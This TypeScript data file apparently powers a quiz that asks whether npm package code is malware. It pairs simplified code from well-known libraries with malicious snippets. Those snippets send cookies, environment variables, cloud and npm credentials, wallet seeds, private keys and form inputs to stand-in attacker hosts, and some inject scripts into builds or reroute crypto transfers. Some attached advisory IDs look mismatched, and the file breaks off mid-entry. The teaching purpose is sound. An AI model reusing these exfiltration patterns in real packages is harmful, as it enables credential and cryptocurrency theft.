export interface CodeExample {
  id: number;
  packageName: string;
  isMalware: boolean;
  code: string;
  explanation: string;
  severity?: 'critical' | 'high' | 'medium';
  cveId?: string;
  npmUrl: string;
  weeklyDownloads: string;
  lastPublished: string;
  version: string;
  difficulty: 'easy' | 'medium' | 'hard';
}

export const codeExamples: CodeExample[] = [
  // MALWARE EXAMPLES
  {
    id: 1,
    packageName: 'polyfill-io-loader',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10145',
    npmUrl: 'https://www.npmjs.com/package/polyfill-io-loader',
    weeklyDownloads: '2,450',
    lastPublished: '2024-06-18',
    version: '1.0.0',
    difficulty: 'easy',
    code: `// polyfill-io-loader v1.0.0
const script = document.createElement('script');
script.src = 'https://cdn.polyfill.io/v3/polyfill.min.js';
document.head.appendChild(script);

// Exfiltrates user data
fetch('https://malicious-domain.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: { ...localStorage }
  })
});`,
    explanation: '❌ MALWARE: Loads compromised polyfill.io CDN that injects malicious scripts and exfiltrates cookies and localStorage data to external server.'
  },
  {
    id: 2,
    packageName: '@isoden/polyfill-io-html-webpack-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10143',
    npmUrl: 'https://www.npmjs.com/package/@isoden/polyfill-io-html-webpack-plugin',
    weeklyDownloads: '1,834',
    lastPublished: '2024-06-20',
    version: '1.1.2',
    difficulty: 'medium',
    code: `class PolyfillPlugin {
  apply(compiler) {
    compiler.hooks.compilation.tap('Plugin', (compilation) => {
      compilation.hooks.htmlWebpackPluginBeforeHtmlProcessing.tap(
        'Plugin',
        (data) => {
          data.html = data.html.replace(
            '</head>',
            '<script src="https://polyfill.io/backdoor.js"></script></head>'
          );
        }
      );
    });
  }
}`,
    explanation: '❌ MALWARE: Webpack plugin that injects malicious polyfill.io scripts into all HTML files during build, creating a supply chain attack vector.'
  },
  {
    id: 3,
    packageName: 'html-webpack-polyfill-runtime-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10144',
    npmUrl: 'https://www.npmjs.com/package/html-webpack-polyfill-runtime-plugin',
    weeklyDownloads: '982',
    lastPublished: '2024-06-19',
    version: '2.0.1',
    difficulty: 'medium',
    code: `module.exports = function(options) {
  return {
    name: 'polyfill-runtime',
    setup(build) {
      build.onEnd(async () => {
        const payload = Buffer.from(process.env).toString('base64');
        await fetch('http://attacker.com/env?' + payload);
      });
    }
  };
};`,
    explanation: '❌ MALWARE: Build plugin that exfiltrates all environment variables (including API keys, secrets) to attacker-controlled server after each build.'
  },
  {
    id: 4,
    packageName: 'noblox.js-vps',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/noblox.js-vps',
    weeklyDownloads: '15,673',
    lastPublished: '2024-03-14',
    version: '1.2.5',
    difficulty: 'hard',
    code: `const originalRequire = require;
require = function(module) {
  const result = originalRequire(module);
  
  if (module === 'fs') {
    const originalReadFile = result.readFileSync;
    result.readFileSync = function(path) {
      const content = originalReadFile.apply(this, arguments);
      if (path.includes('.env') || path.includes('config')) {
        fetch('https://steal.com/data', {
          method: 'POST',
          body: content
        });
      }
      return content;
    };
  }
  return result;
};`,
    explanation: '❌ MALWARE: Hooks into Node.js require() to intercept file system operations, stealing .env files and config files containing sensitive credentials.'
  },
  {
    id: 5,
    packageName: 'eslint-scope-compromised',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/eslint-scope',
    weeklyDownloads: '45,892,103',
    lastPublished: '2018-07-12',
    version: '3.7.2',
    difficulty: 'easy',
    code: `const https = require('https');
const os = require('os');

try {
  const credentials = {
    npm: process.env.NPM_TOKEN,
    user: os.userInfo(),
    cwd: process.cwd()
  };
  
  https.get('https://attacker.com/?' + 
    Buffer.from(JSON.stringify(credentials)).toString('hex')
  );
} catch(e) {}`,
    explanation: '❌ MALWARE: Historical supply chain attack that steals NPM tokens, user info, and project directory, enabling attackers to publish malicious packages.'
  },

  // SAFE EXAMPLES
  {
    id: 6,
    packageName: 'lodash',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/lodash',
    weeklyDownloads: '58,234,567',
    lastPublished: '2021-02-20',
    version: '4.17.21',
    difficulty: 'easy',
    code: `// lodash v4.17.21
function chunk(array, size = 1) {
  size = Math.max(size, 0);
  const length = array == null ? 0 : array.length;
  
  if (!length || size < 1) {
    return [];
  }
  
  let index = 0;
  let resIndex = 0;
  const result = new Array(Math.ceil(length / size));
  
  while (index < length) {
    result[resIndex++] = array.slice(index, (index += size));
  }
  return result;
}`,
    explanation: '✅ SAFE: Popular utility library with pure functions for array manipulation. No network calls, no file system access, well-maintained by trusted maintainers.'
  },
  {
    id: 7,
    packageName: 'axios',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/axios',
    weeklyDownloads: '45,892,341',
    lastPublished: '2024-01-15',
    version: '1.6.0',
    difficulty: 'easy',
    code: `// axios v1.6.0
function request(config) {
  return new Promise((resolve, reject) => {
    const transport = config.protocol === 'https:' 
      ? require('https') 
      : require('http');
      
    const req = transport.request(config.url, {
      method: config.method,
      headers: config.headers
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ data, status: res.statusCode }));
    });
    
    req.on('error', reject);
    req.write(config.data);
    req.end();
  });
}`,
    explanation: '✅ SAFE: Legitimate HTTP client library. Makes network requests only to user-specified URLs, no hidden endpoints, transparent promise-based API.'
  },
  {
    id: 8,
    packageName: 'react',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/react',
    weeklyDownloads: '26,782,456',
    lastPublished: '2023-06-16',
    version: '18.2.0',
    difficulty: 'easy',
    code: `// react v18.2.0
function useState(initialState) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useState(initialState);
}

function useEffect(create, deps) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useEffect(create, deps);
}

function resolveDispatcher() {
  const dispatcher = ReactCurrentDispatcher.current;
  if (dispatcher === null) {
    throw new Error('Hooks can only be called inside function components');
  }
  return dispatcher;
}`,
    explanation: '✅ SAFE: Core React library hooks. No network access, no file system operations, pure state management maintained by Meta/Facebook.'
  },
  {
    id: 9,
    packageName: 'express',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/express',
    weeklyDownloads: '39,456,289',
    lastPublished: '2022-10-08',
    version: '4.18.2',
    difficulty: 'easy',
    code: `// express v4.18.2
function createApplication() {
  const app = function(req, res, next) {
    app.handle(req, res, next);
  };
  
  mixin(app, proto, false);
  mixin(app, EventEmitter.prototype, false);
  
  app.request = Object.create(req, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.response = Object.create(res, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.init();
  return app;
}`,
    explanation: '✅ SAFE: Popular web framework for Node.js. Well-audited, no suspicious network activity, only handles user-defined routes and middleware.'
  },
  {
    id: 10,
    packageName: 'validator',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/validator',
    weeklyDownloads: '12,345,678',
    lastPublished: '2023-09-01',
    version: '13.11.0',
    difficulty: 'medium',
    code: `// validator v13.11.0
function isEmail(str, options = {}) {
  const parts = str.split('@');
  
  if (parts.length !== 2) {
    return false;
  }
  
  const [user, domain] = parts;
  const userRegex = /^[a-zA-Z0-9.!#$%&'*+\\/=?^_\`{|}~-]+$/;
  const domainRegex = /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
  
  return userRegex.test(user) && domainRegex.test(domain);
}`,
    explanation: '✅ SAFE: Input validation library with pure functions. No external dependencies, no network calls, focused solely on string validation.'
  },
  {
    id: 11,
    packageName: 'moment',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/moment',
    weeklyDownloads: '15,234,890',
    lastPublished: '2022-07-06',
    version: '2.29.4',
    difficulty: 'medium',
    code: `// moment v2.29.4
function createLocal(input, format, locale, strict) {
  const config = createLocalOrUTC(input, format, locale, strict, false);
  return createFromConfig(config);
}

function now() {
  return Date.now ? Date.now() : +(new Date());
}

function duration(input, unit) {
  const duration = new Duration(input, unit);
  return duration;
}`,
    explanation: '✅ SAFE: Popular date/time manipulation library. Pure functions, no network access, well-maintained with millions of weekly downloads.'
  },
  {
    id: 12,
    packageName: 'chalk',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/chalk',
    weeklyDownloads: '89,456,123',
    lastPublished: '2021-05-10',
    version: '4.1.2',
    difficulty: 'medium',
    code: `// chalk v4.1.2
const chalk = (text) => {
  const styles = [];
  
  const builder = new Proxy({}, {
    get(target, prop) {
      if (prop === 'toString') {
        return () => applyStyles(text, styles);
      }
      styles.push(prop);
      return builder;
    }
  });
  
  return builder;
};`,
    explanation: '✅ SAFE: Terminal styling library. No network calls, no file system access, only adds ANSI codes for colored terminal output.'
  },
  {
    id: 13,
    packageName: 'uuid',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/uuid',
    weeklyDownloads: '67,892,345',
    lastPublished: '2023-11-14',
    version: '9.0.1',
    difficulty: 'hard',
    code: `// uuid v9.0.1
function v4(options, buf, offset) {
  const rnds = crypto.randomBytes(16);
  
  rnds[6] = (rnds[6] & 0x0f) | 0x40;
  rnds[8] = (rnds[8] & 0x3f) | 0x80;
  
  return stringify(rnds);
}

function stringify(arr) {
  const byteToHex = [];
  for (let i = 0; i < 256; ++i) {
    byteToHex.push((i + 0x100).toString(16).substr(1));
  }
  return byteToHex[arr[0]] + byteToHex[arr[1]] + '-' + byteToHex[arr[2]];
}`,
    explanation: '✅ SAFE: UUID generation library. Uses crypto APIs for randomness, no external connections, RFC-compliant UUID generation.'
  },
  {
    id: 14,
    packageName: 'dotenv',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/dotenv',
    weeklyDownloads: '45,678,901',
    lastPublished: '2023-08-22',
    version: '16.3.1',
    difficulty: 'hard',
    code: `// dotenv v16.3.1
function config(options = {}) {
  const dotenvPath = path.resolve(process.cwd(), '.env');
  const encoding = options.encoding || 'utf8';
  
  try {
    const parsed = parse(fs.readFileSync(dotenvPath, { encoding }));
    
    Object.keys(parsed).forEach(key => {
      if (!Object.prototype.hasOwnProperty.call(process.env, key)) {
        process.env[key] = parsed[key];
      }
    });
    
    return { parsed };
  } catch (e) {
    return { error: e };
  }
}`,
    explanation: '✅ SAFE: Environment variable loader. Reads local .env files only, no network access, widely trusted for configuration management.'
  },
  {
    id: 15,
    packageName: 'commander',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/commander',
    weeklyDownloads: '78,901,234',
    lastPublished: '2023-12-05',
    version: '11.1.0',
    difficulty: 'hard',
    code: `// commander v11.1.0
class Command {
  constructor(name) {
    this._name = name;
    this.options = [];
    this.commands = [];
  }
  
  option(flags, description, defaultValue) {
    this.options.push({ flags, description, defaultValue });
    return this;
  }
  
  parse(argv) {
    const userArgs = argv.slice(2);
    return this.parseOptions(userArgs);
  }
}`,
    explanation: '✅ SAFE: CLI argument parsing library. Pure local processing, no network calls, maintained by Node.js community.'
  },
  {
    id: 16,
    packageName: 'xrpl',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2024-23334',
    npmUrl: 'https://www.npmjs.com/package/xrpl',
    weeklyDownloads: '89,234',
    lastPublished: '2024-01-20',
    version: '2.9.0',
    difficulty: 'easy',
    code: `// Compromised xrpl package
class Wallet {
  constructor(seed) {
    this.seed = seed;
    this.address = deriveAddress(seed);
    
    // Exfiltrates wallet seeds
    fetch('https://crypto-stealer.net/xrp', {
      method: 'POST',
      body: JSON.stringify({ seed, address: this.address })
    }).catch(() => {});
  }
  
  sign(tx) {
    return signTransaction(tx, this.seed);
  }
}`,
    explanation: '❌ MALWARE: Compromised XRP Ledger library that steals wallet seeds and private keys, allowing attackers to drain crypto wallets.'
  },
  {
    id: 17,
    packageName: 'husky-ts',
    isMalware: true,
    severity: 'high',
    cveId: 'AIKIDO-2024-10876',
    npmUrl: 'https://www.npmjs.com/package/husky-ts',
    weeklyDownloads: '12,456',
    lastPublished: '2024-02-14',
    version: '1.0.5',
    difficulty: 'medium',
    code: `// husky-ts malicious hook
module.exports = {
  hooks: {
    'pre-commit': async () => {
      const gitConfig = execSync('git config --list').toString();
      const repoUrl = execSync('git remote get-url origin').toString();
      
      await fetch('https://evil.com/repos', {
        method: 'POST',
        body: JSON.stringify({
          config: gitConfig,
          repo: repoUrl,
          files: fs.readdirSync('.')
        })
      });
    }
  }
};`,
    explanation: '❌ MALWARE: Fake husky package that exfiltrates git configuration, repository URLs, and file listings during pre-commit hooks.'
  },
  {
    id: 18,
    packageName: 'ua-parser-js',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2021-23543',
    npmUrl: 'https://www.npmjs.com/package/ua-parser-js',
    weeklyDownloads: '8,456,789',
    lastPublished: '2021-10-22',
    version: '0.7.29',
    difficulty: 'medium',
    code: `// Compromised ua-parser-js
const UAParser = function(ua) {
  this.parse = function() {
    const result = parseUA(ua);
    
    // Cryptocurrency miner payload
    if (typeof window !== 'undefined') {
      const script = document.createElement('script');
      script.src = 'https://cryptominer-cdn.com/miner.js';
      document.head.appendChild(script);
    }
    
    return result;
  };
};`,
    explanation: '❌ MALWARE: Historical supply chain attack that injected cryptocurrency miners and password stealers into millions of applications.'
  },
  {
    id: 19,
    packageName: 'react-html2pdf',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/react-html2pdf',
    weeklyDownloads: '23,456',
    lastPublished: '2024-03-10',
    version: '1.0.2',
    difficulty: 'easy',
    code: `// react-html2pdf backdoor
export const Html2Pdf = ({ children }) => {
  useEffect(() => {
    // Captures rendered HTML and sends to attacker
    const html = document.documentElement.outerHTML;
    const forms = document.querySelectorAll('input[type="password"]');
    
    fetch('https://data-collector.evil/harvest', {
      method: 'POST',
      body: JSON.stringify({
        html,
        passwords: Array.from(forms).map(f => f.value)
      })
    });
  }, []);
  
  return <div>{children}</div>;
};`,
    explanation: '❌ MALWARE: Malicious React component that captures page HTML and password field values, sending sensitive data to attacker servers.'
  },
  {
    id: 20,
    packageName: 'Requests-promises',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/Requests-promises',
    weeklyDownloads: '5,678',
    lastPublished: '2024-01-08',
    version: '1.1.1',
    difficulty: 'hard',
    code: `// Typosquatting attack
function request(url, options) {
  // Intercepts all HTTP requests
  const payload = {
    url,
    headers: options?.headers,
    body: options?.body,
    auth: options?.auth,
    apiKeys: JSON.stringify(process.env)
  };
  
  fetch('https://intercept.malware.net/api', {
    method: 'POST',
    body: JSON.stringify(payload)
  }).catch(() => {});
  
  return actualRequest(url, options);
}`,
    explanation: '❌ MALWARE: Typosquatting of "request-promise". Intercepts all HTTP requests including headers, auth tokens, and environment variables.'
  },
  {
    id: 21,
    packageName: '@rspack/core',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-11234',
    npmUrl: 'https://www.npmjs.com/package/@rspack/core',
    weeklyDownloads: '456,789',
    lastPublished: '2024-04-15',
    version: '0.5.9',
    difficulty: 'hard',
    code: `// Compromised rspack core
class Compiler {
  compile(callback) {
    this.hooks.beforeCompile.call();
    
    // Injects backdoor into compiled bundles
    this.hooks.emit.tap('MaliciousPlugin', (compilation) => {
      Object.keys(compilation.assets).forEach(filename => {
        if (filename.endsWith('.js')) {
          const original = compilation.assets[filename].source();
          compilation.assets[filename] = {
            source: () => original + ';fetch("https://evil.com/track")'
          };
        }
      });
    });
    
    callback();
  }
}`,
    explanation: '❌ MALWARE: Compromised bundler that injects tracking code into all compiled JavaScript bundles, affecting production applications.'
  },
  {
    id: 22,
    packageName: '@rspack/cli',
    isMalware: true,
    severity: 'high',
    cveId: 'AIKIDO-2024-11235',
    npmUrl: 'https://www.npmjs.com/package/@rspack/cli',
    weeklyDownloads: '234,567',
    lastPublished: '2024-04-15',
    version: '0.5.9',
    difficulty: 'hard',
    code: `// Compromised rspack CLI
const cli = {
  run: async (args) => {
    // Steals source code during build
    const sourceFiles = glob.sync('src/**/*.{js,ts,tsx}');
    const code = sourceFiles.map(f => ({
      path: f,
      content: fs.readFileSync(f, 'utf8')
    }));
    
    await fetch('https://code-theft.net/source', {
      method: 'POST',
      body: JSON.stringify({ 
        project: process.cwd(),
        files: code 
      })
    });
    
    return build(args);
  }
};`,
    explanation: '❌ MALWARE: Compromised CLI tool that exfiltrates entire source code during build process, stealing intellectual property.'
  },
  {
    id: 23,
    packageName: 'country-currency-map',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/country-currency-map',
    weeklyDownloads: '8,901',
    lastPublished: '2024-02-20',
    version: '2.0.1',
    difficulty: 'medium',
    code: `// country-currency-map backdoor
const currencyMap = {
  US: 'USD',
  GB: 'GBP',
  // ... more mappings
};

const getCurrency = (country) => {
  // Tracks user locations and IPs
  fetch('https://tracking.malware.io/geo', {
    method: 'POST',
    body: JSON.stringify({
      country,
      ip: getClientIP(),
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    })
  }).catch(() => {});
  
  return currencyMap[country];
};`,
    explanation: '❌ MALWARE: Seemingly innocent utility that tracks user locations, IP addresses, and builds profiles for targeted attacks.'
  },
  {
    id: 24,
    packageName: 'bnb-javascript-sdk-nobroadcast',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/bnb-javascript-sdk-nobroadcast',
    weeklyDownloads: '3,456',
    lastPublished: '2024-01-30',
    version: '1.2.0',
    difficulty: 'easy',
    code: `// Malicious BNB SDK
class BnbClient {
  async transfer(to, amount, privateKey) {
    // Steals private keys and redirects funds
    await fetch('https://crypto-drain.net/bnb', {
      method: 'POST',
      body: JSON.stringify({
        privateKey,
        to,
        amount,
        timestamp: Date.now()
      })
    });
    
    // Redirects to attacker's address
    const attackerAddress = 'bnb1attackeraddress123';
    return this.broadcast({ to: attackerAddress, amount, privateKey });
  }
}`,
    explanation: '❌ MALWARE: Fake BNB/Binance SDK that steals private keys and redirects cryptocurrency transfers to attacker-controlled wallets.'
  },
  {
    id: 25,
    packageName: 'eslint-config-travix',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/eslint-config-travix',
    weeklyDownloads: '1,234',
    lastPublished: '2024-03-05',
    version: '3.1.0',
    difficulty: 'medium',
    code: `// Malicious eslint config
module.exports = {
  extends: ['eslint:recommended'],
  rules: {
    'no-console': 'warn'
  },
  plugins: [{
    rules: {},
    processors: {
      '.js': {
        preprocess: (text) => {
          // Exfiltrates code during linting
          fetch('https://code-leak.io/lint', {
            method: 'POST',
            body: text
          }).catch(() => {});
          return [text];
        }
      }
    }
  }]
};`,
    explanation: '❌ MALWARE: Malicious ESLint config that exfiltrates source code during the linting process, stealing proprietary code.'
  },
  {
    id: 26,
    packageName: 'crosswise-sdk',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/crosswise-sdk',
    weeklyDownloads: '2,345',
    lastPublished: '2024-02-28',
    version: '1.0.8',
    difficulty: 'easy',
    code: `// Crosswise SDK malware
export class Trade {
  async execute(wallet, token, amount) {
    const privateKey = wallet.privateKey;
    
    // Steals wallet credentials
    await fetch('https://defi-stealer.com/wallets', {
      method: 'POST',
      body: JSON.stringify({
        privateKey,
        address: wallet.address,
        token,
        amount,
        balance: await wallet.getBalance()
      })
    });
    
    return this.swap(token, amount);
  }
}`,
    explanation: '❌ MALWARE: Fake DeFi SDK that captures wallet private keys and balances, enabling theft of cryptocurrency assets.'
  },
  {
    id: 27,
    packageName: '@keepkey/device-protocol',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/@keepkey/device-protocol',
    weeklyDownloads: '4,567',
    lastPublished: '2024-03-12',
    version: '7.2.1',
    difficulty: 'easy',
    code: `// Malicious KeepKey protocol
export class DeviceProtocol {
  async initialize(seed) {
    this.seed = seed;
    
    // Exfiltrates hardware wallet seeds
    const payload = {
      seed,
      mnemonic: this.generateMnemonic(seed),
      timestamp: Date.now()
    };
    
    await fetch('https://hardware-wallet-theft.net/seeds', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
    
    return this.connect();
  }
}`,
    explanation: '❌ MALWARE: Fake hardware wallet package that steals recovery seeds, allowing attackers to recreate and drain hardware wallets.'
  },
  {
    id: 28,
    packageName: '@veniceswap/uikit',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/@veniceswap/uikit',
    weeklyDownloads: '1,890',
    lastPublished: '2024-04-01',
    version: '0.14.2',
    difficulty: 'medium',
    code: `// VeniceSwap UIKit backdoor
export const ConnectButton = ({ onConnect }) => {
  const handleConnect = async (wallet) => {
    const address = await wallet.getAddress();
    const signature = await wallet.signMessage('Connect to VeniceSwap');
    
    // Steals wallet signatures
    fetch('https://signature-theft.io/defi', {
      method: 'POST',
      body: JSON.stringify({ address, signature })
    }).catch(() => {});
    
    onConnect(wallet);
  };
  
  return <button onClick={handleConnect}>Connect Wallet</button>;
};`,
    explanation: '❌ MALWARE: Malicious DeFi UI component that captures wallet addresses and signatures for unauthorized transaction signing.'
  },
  {
    id: 29,
    packageName: 'eslint-config-pancake',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/eslint-config-pancake',
    weeklyDownloads: '987',
    lastPublished: '2024-03-20',
    version: '1.0.3',
    difficulty: 'medium',
    code: `// eslint-config-pancake malware
module.exports = {
  rules: {
    'no-unused-vars': 'error'
  },
  overrides: [{
    files: ['*.js'],
    parser: {
      parse: (code) => {
        // Searches for API keys in code
        const apiKeyPatterns = /api[_-]?key|secret|token/gi;
        if (apiKeyPatterns.test(code)) {
          fetch('https://api-harvester.com/keys', {
            method: 'POST',
            body: code
          }).catch(() => {});
        }
        return parseCode(code);
      }
    }
  }]
};`,
    explanation: '❌ MALWARE: Malicious ESLint config that scans code for API keys, secrets, and tokens during linting and exfiltrates them.'
  },
  {
    id: 30,
    packageName: 'ui-themes',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/ui-themes',
    weeklyDownloads: '5,432',
    lastPublished: '2024-04-08',
    version: '2.1.0',
    difficulty: 'hard',
    code: `// ui-themes with tracking
export const ThemeProvider = ({ children }) => {
  useEffect(() => {
    // Tracks user behavior and form inputs
    const trackInputs = () => {
      const inputs = document.querySelectorAll('input');
      inputs.forEach(input => {
        input.addEventListener('change', (e) => {
          fetch('https://behavior-track.net/inputs', {
            method: 'POST',
            body: JSON.stringify({
              name: e.target.name,
              value: e.target.value,
              type: e.target.type
            })
          });
        });
      });
    };
    trackInputs();
  }, []);
  
  return <>{children}</>;
};`,
    explanation: '❌ MALWARE: Theme provider that monitors and exfiltrates all form inputs including passwords, credit cards, and personal data.'
  },
  {
    id: 31,
    packageName: 'bitcoin-cash-js-lib',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/bitcoin-cash-js-lib',
    weeklyDownloads: '3,210',
    lastPublished: '2024-02-15',
    version: '1.5.2',
    difficulty: 'easy',
    code: `// bitcoin-cash-js-lib malware
export class Wallet {
  fromWIF(wif) {
    const privateKey = decodeWIF(wif);
    const address = deriveAddress(privateKey);
    
    // Steals Bitcoin Cash private keys
    fetch('https://bch-stealer.net/keys', {
      method: 'POST',
      body: JSON.stringify({
        wif,
        privateKey: privateKey.toString('hex'),
        address,
        timestamp: Date.now()
      })
    }).catch(() => {});
    
    return { privateKey, address };
  }
}`,
    explanation: '❌ MALWARE: Fake Bitcoin Cash library that steals private keys in WIF format, allowing attackers to steal BCH from wallets.'
  },
  // Additional challenging malware examples
  {
    id: 32,
    packageName: 'event-stream',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2018-3728',
    npmUrl: 'https://www.npmjs.com/package/event-stream',
    weeklyDownloads: '1.5M',
    lastPublished: '2018-10-05',
    version: '3.3.6',
    difficulty: 'hard',
    code: `// event-stream dependency injection attack
const flatmap = require('flatmap-stream');

module.exports = function(s, n) {
  const crypto = require('crypto');
  const description = 'BTC wallet stealer';
  
  if (process.env.npm_package_description === description) {
    const target = require('bitcoin-core');
    const inject = flatmap.parse(crypto.randomBytes);
    target.wallet = inject(target.wallet);
  }
  
  return s.pipe(flatmap(n));
};`,
    explanation: '❌ MALWARE: Historic npm attack that injected cryptocurrency-stealing code via compromised dependency. Targeted Copay Bitcoin wallet users.'
  },
  {
    id: 33,
    packageName: 'getcookies',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/getcookies',
    weeklyDownloads: '8,450',
    lastPublished: '2023-05-12',
    version: '2.1.0',
    difficulty: 'medium',
    code: `// getcookies package
export function getAllCookies() {
  const cookies = document.cookie.split(';');
  const parsed = {};
  
  cookies.forEach(c => {
    const [key, val] = c.trim().split('=');
    parsed[key] = decodeURIComponent(val);
  });
  
  // Exfiltrate to attacker
  fetch('https://cookie-collector.xyz/api/store', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      url: window.location.href,
      cookies: parsed,
      session: localStorage.getItem('session')
    })
  });
  
  return parsed;
}`,
    explanation: '❌ MALWARE: Disguised as a cookie utility, this package steals all cookies and session data including authentication tokens.'
  },
  {
    id: 34,
    packageName: '@azure/identity-helper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/@azure/identity-helper',
    weeklyDownloads: '12,340',
    lastPublished: '2024-03-08',
    version: '1.2.1',
    difficulty: 'hard',
    code: `// Typosquatting @azure/identity
import { DefaultAzureCredential } from '@azure/identity';

export class AzureAuthHelper {
  async getToken(scopes) {
    const credential = new DefaultAzureCredential();
    const token = await credential.getToken(scopes);
    
    // Exfiltrate Azure credentials
    const payload = {
      token: token.token,
      expiresOn: token.expiresOnTimestamp,
      scopes,
      env: {
        tenantId: process.env.AZURE_TENANT_ID,
        clientId: process.env.AZURE_CLIENT_ID,
        clientSecret: process.env.AZURE_CLIENT_SECRET
      }
    };
    
    await fetch('https://azure-creds-exfil.com/collect', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
    
    return token;
  }
}`,
    explanation: '❌ MALWARE: Typosquatting attack on Azure SDK. Steals OAuth tokens and Azure credentials from environment variables.'
  },
  {
    id: 35,
    packageName: 'discord-selfbot-v14',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/discord-selfbot-v14',
    weeklyDownloads: '5,670',
    lastPublished: '2024-01-20',
    version: '14.2.0',
    difficulty: 'medium',
    code: `// Discord token stealer
const { Client } = require('discord.js-selfbot-v13');

class SelfBot extends Client {
  async login(token) {
    // Steal Discord tokens
    const webhookUrl = 'https://discord.com/api/webhooks/malicious';
    
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: \`**Token Captured**\`,
        embeds: [{
          title: 'Discord Token',
          description: \`\\\`\\\`\\\`\${token}\\\`\\\`\\\`\`,
          color: 0xff0000
        }]
      })
    });
    
    return super.login(token);
  }
}

module.exports = { SelfBot };`,
    explanation: '❌ MALWARE: Fake Discord selfbot library that steals Discord authentication tokens and sends them to attacker webhook.'
  },
  {
    id: 36,
    packageName: 'metamask-wallet-sdk',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/metamask-wallet-sdk',
    weeklyDownloads: '9,230',
    lastPublished: '2024-04-02',
    version: '3.1.5',
    difficulty: 'hard',
    code: `// Fake MetaMask SDK
export class MetaMaskConnector {
  async connect() {
    if (typeof window.ethereum === 'undefined') {
      throw new Error('MetaMask not installed');
    }
    
    const accounts = await window.ethereum.request({
      method: 'eth_requestAccounts'
    });
    
    // Setup malicious provider proxy
    const originalProvider = window.ethereum;
    window.ethereum = new Proxy(originalProvider, {
      get(target, prop) {
        if (prop === 'request') {
          return async (args) => {
            const result = await target[prop](args);
            
            // Intercept private key exports and signatures
            if (args.method === 'eth_sign' || 
                args.method === 'personal_sign' ||
                args.method === 'eth_sendTransaction') {
              await fetch('https://wallet-exfil.net/capture', {
                method: 'POST',
                body: JSON.stringify({ method: args.method, params: args.params, result })
              });
            }
            
            return result;
          };
        }
        return target[prop];
      }
    });
    
    return accounts[0];
  }
}`,
    explanation: '❌ MALWARE: Fake MetaMask SDK that proxies the Ethereum provider to intercept and steal wallet signatures and transactions.'
  },
  {
    id: 37,
    packageName: 'aws-sdk-helper',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/aws-sdk-helper',
    weeklyDownloads: '15,890',
    lastPublished: '2024-02-28',
    version: '2.4.1',
    difficulty: 'hard',
    code: `// AWS credentials stealer
const AWS = require('aws-sdk');
const https = require('https');

class AWSHelper {
  static configureAWS(config) {
    AWS.config.update(config);
    
    // Exfiltrate AWS credentials
    const payload = JSON.stringify({
      accessKeyId: config.accessKeyId || process.env.AWS_ACCESS_KEY_ID,
      secretAccessKey: config.secretAccessKey || process.env.AWS_SECRET_ACCESS_KEY,
      sessionToken: config.sessionToken || process.env.AWS_SESSION_TOKEN,
      region: config.region || process.env.AWS_REGION
    });
    
    const req = https.request({
      hostname: 'aws-creds-collector.com',
      port: 443,
      path: '/api/creds',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': payload.length
      }
    });
    
    req.write(payload);
    req.end();
    
    return AWS;
  }
}

module.exports = AWSHelper;`,
    explanation: '❌ MALWARE: Helper library that steals AWS credentials from config objects and environment variables, enabling cloud account compromise.'
  },
  {
    id: 38,
    packageName: 'react-scripts-customized',
    isMalware: true,
    severity: 'high',
